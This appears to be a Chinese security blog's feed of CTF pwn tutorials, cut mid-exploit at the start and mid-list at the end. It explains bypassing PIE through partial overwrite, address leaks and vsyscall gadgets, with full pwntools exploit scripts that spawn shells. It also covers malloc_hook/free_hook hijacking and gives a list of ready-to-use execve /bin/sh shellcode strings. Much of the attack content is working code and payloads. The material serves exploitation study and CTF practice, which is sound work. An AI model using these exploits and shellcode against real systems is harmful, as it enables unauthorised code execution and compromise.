p64(rax_15) + p64(syscall) + flat(sigframe))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>inter()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pie保护</title>
    <link href="/2024/05/04/pie%E4%BF%9D%E6%8A%A4/"/>
    <url>/2024/05/04/pie%E4%BF%9D%E6%8A%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h2><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题</p><p>下面通过一个例子来具体看一下PIE的效果</p><p>程序源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">houmen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vuln</span>();    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-stack-protector -no-pie -s test.c -o <span class="hljs-built_in">test</span>        <span class="hljs-comment">#不开启PIE保护</span><br></code></pre></td></tr></table></figure><p>不开启PIE保护的时候每次运行时加载地址不变</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192433736.png" alt="image-20231215192433736"></p><p>开启PIE保护的时候每次运行时加载地址是随机变化的</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192452070.png" alt="image-20231215192452070"></p><h2 id="一、partial-write"><a href="#一、partial-write" class="headerlink" title="一、partial write"></a>一、partial write</h2><p>partial write就是利用了PIE技术的缺陷。我们知道，内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">houmen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> a[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,a,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(a);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vuln</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-meta"># gcc -m32 -fno-stack-protector  -s test.c -o test</span><br></code></pre></td></tr></table></figure><p>明显的栈溢出，通过gdb调试，直接来到vuln函数的ret处，可以看到houmen函数的地址和返回地址只有后几位不一样，那么我们覆盖地址的后4位即可</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192610010.png" alt="image-20231215192610010"></p><p>由于地址的后3位一样，所以覆盖的话至少需要4位，那么倒数第四位就需要爆破，爆破范围在0到0xf</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;deepin-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span> ,<span class="hljs-string">&#x27;-c&#x27;</span>]<br><br>offset = <span class="hljs-number">0x1c</span>+<span class="hljs-number">4</span><br>list1 = [<span class="hljs-string">&quot;x05&quot;</span>,<span class="hljs-string">&quot;x15&quot;</span>,<span class="hljs-string">&quot;x25&quot;</span>,<span class="hljs-string">&quot;x35&quot;</span>,<span class="hljs-string">&quot;x45&quot;</span>,<span class="hljs-string">&quot;x55&quot;</span>,<span class="hljs-string">&quot;x65&quot;</span>,<span class="hljs-string">&quot;x75&quot;</span>,<span class="hljs-string">&quot;x85&quot;</span>,<span class="hljs-string">&quot;x95&quot;</span>,<span class="hljs-string">&quot;xa5&quot;</span>,<span class="hljs-string">&quot;xb5&quot;</span>,<span class="hljs-string">&quot;xc5&quot;</span>,<span class="hljs-string">&quot;xd5&quot;</span>,<span class="hljs-string">&quot;xe5&quot;</span>,<span class="hljs-string">&quot;xf5&quot;</span>]<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        p = process(<span class="hljs-string">&quot;./test&quot;</span>)<br>        payload = offset*<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-string">&quot;x7d&quot;</span>+random.sample(list1,<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]<br>        p.send(payload)<br>        p.recv()<br>        p.recv()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br>        <span class="hljs-built_in">print</span> e<br></code></pre></td></tr></table></figure><p>可以很快的得到爆破的结果</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192644086.png" alt="image-20231215192644086"></p><h2 id="二、泄露地址"><a href="#二、泄露地址" class="headerlink" title="二、泄露地址"></a>二、泄露地址</h2><p>开启PIE保护的话影响的是程序加载的基地址，不会影响指令间的相对地址，因此我们如果能够泄露出程序或者libc的某些地址，我们就可以利用偏移来构造ROP</p><p>以国赛your_pwn作为例子，该程序保护全开，漏洞点在sub_B35函数，index索引没有控制大小，所以导致任意地址读和任意地址写。</p><p>泄露libc地址和泄露程序基地址的方法是在main函数栈帧中有一个__libc_start_main+231和push r15，可以通过泄露这两个地址计算出libc基地址和程序加载基地址</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192836254.png" alt="image-20231215192836254"></p><p>exp：（需要用到LibcSearcher）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;deepin-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span> ,<span class="hljs-string">&#x27;-c&#x27;</span>]<br>r = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>__libc_start_main_231_offset = <span class="hljs-number">0x150</span>+<span class="hljs-number">296</span><br><br>r.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br>r.sendline(<span class="hljs-string">&quot;radish&quot;</span>)<br>__libc_start_main_231_addr = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># leak __libc_start_main_231_addr</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(__libc_start_main_231_offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;(hex) &quot;</span>)<br>    data = r.recvuntil(<span class="hljs-string">&quot;n&quot;</span>,drop=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)&gt;<span class="hljs-number">2</span>:<br>        data = data[-<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">1</span>:<br>        data = <span class="hljs-string">&quot;0&quot;</span>+data<br>    __libc_start_main_231_addr = data+__libc_start_main_231_addr<br>    r.recvuntil(<span class="hljs-string">&quot;input new value&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>log.info(<span class="hljs-string">&quot;__libc_start_main_231_addr -&gt;&gt; &quot;</span>+__libc_start_main_231_addr)<br>__libc_start_main_231_addr = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+__libc_start_main_231_addr)<br><br><br>push_r15_offset = <span class="hljs-number">0x150</span>+<span class="hljs-number">288</span><br>push_r15_addr = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(push_r15_offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;(hex) &quot;</span>)<br>    data = r.recvuntil(<span class="hljs-string">&quot;n&quot;</span>,drop=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)&gt;<span class="hljs-number">2</span>:<br>        data = data[-<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">1</span>:<br>        data = <span class="hljs-string">&quot;0&quot;</span>+data<br>    push_r15_addr = data+push_r15_addr<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>log.info(<span class="hljs-string">&quot;push_r15_addr -&gt;&gt; &quot;</span>+push_r15_addr)<br>push_r15_addr = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+push_r15_addr)<br><br>main_addr = push_r15_addr - <span class="hljs-number">0x23b</span><br><br><span class="hljs-comment"># cover ret_addr</span><br>offset = <span class="hljs-number">0x150</span>+<span class="hljs-number">8</span><br>main_addr = p64(main_addr).encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> main_addr<br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+main_addr[num:num+<span class="hljs-number">2</span>])))<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+main_addr[num:num+<span class="hljs-number">2</span>]))<br>    num = num + <span class="hljs-number">2</span><br><br>log.info(<span class="hljs-string">&quot;------------------- success cover! -------------------&quot;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">41</span>-<span class="hljs-number">24</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br><br>r.recv()<br>r.sendline(<span class="hljs-string">&quot;yes&quot;</span>)<br>r.recv()<br><br>log.info(<span class="hljs-string">&quot;------------------- ret main success ---------------&quot;</span>)<br><br>pop_rdi_addr =  <span class="hljs-number">99</span>+push_r15_addr<br><br>__libc_start_main_addr = __libc_start_main_231_addr-<span class="hljs-number">231</span><br><span class="hljs-comment"># libc = LibcSearcher(&quot;__libc_start_main&quot;,__libc_start_main_addr)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>base_addr = __libc_start_main_addr-libc.symbols[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base_addr)<br>system_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+base_addr<br>bin_sh_addr = <span class="hljs-number">0x000000000017d3f3</span>+base_addr<br>log.info(<span class="hljs-string">&quot;system_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br>log.info(<span class="hljs-string">&quot;bin_sh_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(bin_sh_addr))<br><br>payload = (p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr)).encode(<span class="hljs-string">&quot;hex&quot;</span>)<br><span class="hljs-built_in">print</span> payload<br><br>r.sendline(<span class="hljs-string">&quot;radish&quot;</span>)<br><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(offset+x))<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+payload[num:num+<span class="hljs-number">2</span>])))<br>    <span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;0x&quot;</span>+payload[num:num+<span class="hljs-number">2</span>]))<br>    num = num + <span class="hljs-number">2</span><br><br>log.info(<span class="hljs-string">&quot;------------------- cover payload success ---------------&quot;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">41</span>-<span class="hljs-number">24</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;input indexn&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;input new valuen&quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;0&quot;</span>)<br>r.recv()<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.sendline(<span class="hljs-string">&quot;yes&quot;</span>)<br>sleep(<span class="hljs-number">0.2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="三、vdso-vsyscall"><a href="#三、vdso-vsyscall" class="headerlink" title="三、vdso&#x2F;vsyscall"></a>三、vdso&#x2F;vsyscall</h2><p>vsyscall是什么呢？</p><p>通过查阅资料得知，vsyscall是第一种也是最古老的一种用于加快系统调用的机制，工作原理十分简单，许多硬件上的操作都会被包装成内核函数，然后提供一个接口，供用户层代码调用，这个接口就是我们常用的int 0x80和syscall+调用号。</p><p>当通过这个接口来调用时，由于需要进入到内核去处理，因此为了保证数据的完整性，需要在进入内核之前把寄存器的状态保存好，然后进入到内核状态运行内核函数，当内核函数执行完的时候会将返回结果放到相应的寄存器和内存中，然后再对寄存器进行恢复，转换到用户层模式。</p><p>这一过程需要消耗一定的性能，对于某些经常被调用的系统函数来说，肯定会造成很大的内存浪费，因此，系统把几个常用的内核调用从内核中映射到用户层空间中，从而引入了vsyscall</p><p>通过命令“cat &#x2F;proc&#x2F;self&#x2F;maps| grep vsyscall”查看，发现vsyscall地址是不变的</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192754735.png" alt="image-20231215192754735"></p><p>使用gdb把vsyscall从内存中dump下来，拖到IDA中分析</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192739784.png" alt="image-20231215192739784"></p><p>可以看到里面有三个系统调用，根据对应表得出这三个系统调用分别是__NR_gettimeofday、__NR<em>time、</em>_NR_getcpu</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_gettimeofday 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_time 201</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_getcpu 309</span><br></code></pre></td></tr></table></figure><p>这三个都是系统调用，并且也都是通过syscall来实现的，这就意味着我们有了一个可控的syscall</p><p>拿一道CTF真题来做为例子（1000levels）：</p><p>程序具体漏洞这里不再过多的解释，只写涉及到利用vsyscall的步骤</p><p>当我们直接调用vsyscall中的syscall时，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错</p><p>所以，我们可以直接利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</p><p>程序开启了PIE，无法从该程序中直接跳转到main函数或者其他地址，因此可以使用vsyscall来充当gadget，使用它的原因也是因为它在内存中的地址是不变的</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>io =process(<span class="hljs-string">&#x27;1000levels&#x27;</span>, env=&#123;<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>:<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>&#125;)<br><br>libc_base = -<span class="hljs-number">0x456a0</span>                    <span class="hljs-comment">#减去system函数离libc开头的偏移</span><br>one_gadget_base = <span class="hljs-number">0x45526</span>            <span class="hljs-comment">#加上one gadget rce离libc开头的偏移</span><br>vsyscall_gettimeofday = <span class="hljs-number">0xffffffffff600000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">answer</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;Question: &#x27;</span>) <br>    answer = <span class="hljs-built_in">eval</span>(io.recvuntil(<span class="hljs-string">&#x27; = &#x27;</span>)[:-<span class="hljs-number">3</span>])<br>    io.recvuntil(<span class="hljs-string">&#x27;Answer:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(answer))<br>io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)    <br>io.recvuntil(<span class="hljs-string">&#x27;How many levels?&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Any more?&#x27;</span>)<br><br>io.sendline(<span class="hljs-built_in">str</span>(libc_base+one_gadget_base))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>):<br>    log.info(i)<br>    answer()<br><br>io.recvuntil(<span class="hljs-string">&#x27;Question: &#x27;</span>)<br><br>io.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(vsyscall_gettimeofday)*<span class="hljs-number">3</span>) <br>io.interactive()<br></code></pre></td></tr></table></figure><p>vdso好处是其中的指令可以任意执行，不需要从入口开始，坏处是它的地址是随机化的，如果要利用它，就需要爆破它的地址，在64位下需要爆破的位数很多，但是在32位下需要爆破的字节数就很少。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于malloc_hook与free_hook</title>
    <link href="/2024/05/04/%E5%85%B3%E4%BA%8Emalloc-hook%E4%B8%8Efree-hook/"/>
    <url>/2024/05/04/%E5%85%B3%E4%BA%8Emalloc-hook%E4%B8%8Efree-hook/</url>
    
    <content type="html"><![CDATA[<h2 id="关于malloc-hook与free-hook-钩子函数"><a href="#关于malloc-hook与free-hook-钩子函数" class="headerlink" title="关于malloc_hook与free_hook(钩子函数)"></a>关于malloc_hook与free_hook(钩子函数)</h2><h3 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="malloc_hook"></a>malloc_hook</h3><p>  版本不一样__malloc_hook在main_arena的上方偏移是不确定的（如-0x10），unsorted bin中可能存在<code>main_arena+88</code>或者main_arena+96（具体情况具体分析），这个函数被称为钩子函数是因为，当运行malloc函数时，也会自动的运行该函数，所以只需要把该函数改为system地址，那么只要在malloc时填入binsh地址就可以getshell。</p><p>  fastbin在分配时并不检查对齐情况，将fastbin的fd设置为__malloc_hook-0x23，触发fastbin attack分配得到malloc_hook上方内存空间，向malloc_hook进行写入one_gadget得到权限。</p><h3 id="free-hook"><a href="#free-hook" class="headerlink" title="free_hook"></a>free_hook</h3><p>与malloc_hook同理，在运行free()函数时，会自动运行的一个函数</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一些可视化shell</title>
    <link href="/2024/05/04/%E4%B8%80%E4%BA%9B%E5%8F%AF%E8%A7%86%E5%8C%96shell/"/>
    <url>/2024/05/04/%E4%B8%80%E4%BA%9B%E5%8F%AF%E8%A7%86%E5%8C%96shell/</url>
    
    <content type="html"><![CDATA[<h1 id="32位-短字节shellcode-–-21字节"><a href="#32位-短字节shellcode-–-21字节" class="headerlink" title="32位 短字节shellcode –&gt; 21字节"></a>32位 短字节shellcode –&gt; 21字节</h1><p>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</p><h1 id="32位-纯ascii字符shellcode"><a href="#32位-纯ascii字符shellcode" class="headerlink" title="32位 纯ascii字符shellcode"></a>32位 纯ascii字符shellcode</h1><p>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</p><h1 id="32位-scanf可读取的shellcode"><a href="#32位-scanf可读取的shellcode" class="headerlink" title="32位 scanf可读取的shellcode"></a>32位 scanf可读取的shellcode</h1><p>\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff&#x2F;bin&#x2F;sh</p><h1 id="64位-scanf可读取的shellcode-22字节"><a href="#64位-scanf可读取的shellcode-22字节" class="headerlink" title="64位 scanf可读取的shellcode 22字节"></a>64位 scanf可读取的shellcode 22字节</h1><p>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</p><h1 id="64位-较短的shellcode-23字节"><a href="#64位-较短的shellcode-23字节" class="headerlink" title="64位 较短的shellcode  23字节"></a>64位 较短的shellcode  23字节</h1><p>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</p><h1 id="64位-纯ascii字符shellcode"><a href="#64位-纯ascii字符shellcode" class="headerlink" title="64位 纯ascii字符shellcode"></a>64位 